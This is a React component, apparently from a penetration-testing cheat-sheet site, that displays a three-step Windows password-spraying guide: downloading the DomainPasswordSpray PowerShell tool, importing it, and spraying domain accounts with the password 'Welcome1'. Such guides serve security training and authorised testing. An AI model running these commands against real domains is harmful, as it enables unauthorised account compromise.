import {
  Typography,
  Accordion,
  AccordionSummary,
  AccordionDetails,
  Box,
} from "@mui/material";
import SyntaxHighlighter from "react-syntax-highlighter";
import ExpandMoreIcon from "@mui/icons-material/ExpandMore";

interface IProps {
  title: string;
}

const PasswordSprayingPE = ({ title }: IProps) => {
  return (
    <>
      {" "}
      <Accordion sx={{ backgroundColor: "primary.main" }}>
        <AccordionSummary
          expandIcon={<ExpandMoreIcon />}
          aria-controls="panel1a-content"
          id="panel1a-header"
        >
          <Typography>{title}</Typography>
        </AccordionSummary>
        <AccordionDetails
          sx={{ backgroundColor: "primary.background_accordian" }}
        >
          <Typography
            sx={{
              color: "primary.main",
            }}
          >
            <Typography variant="h6">Description</Typography>
            <Typography>
              Once we obtain a list of valid users, we can password spray with a
              common password to try and login.
            </Typography>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 1 - Windows</Typography>
            <Typography>
              Get the DomainPasswordSpray tool below. If we are authenticated to
              the domain, the tool will automatically generate a user list from
              Active Directory, query the domain password policy, and exclude
              user accounts within one attempt of locking out.
            </Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {
                "wget https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/master/DomainPasswordSpray.ps1"
              }
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 2 - Windows</Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {"Import-Module .\\DomainPasswordSpray.ps1"}
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 3 - Windows</Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {
                "Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue"
              }
            </SyntaxHighlighter>
          </Typography>
        </AccordionDetails>
      </Accordion>
    </>
  );
};

export default PasswordSprayingPE;
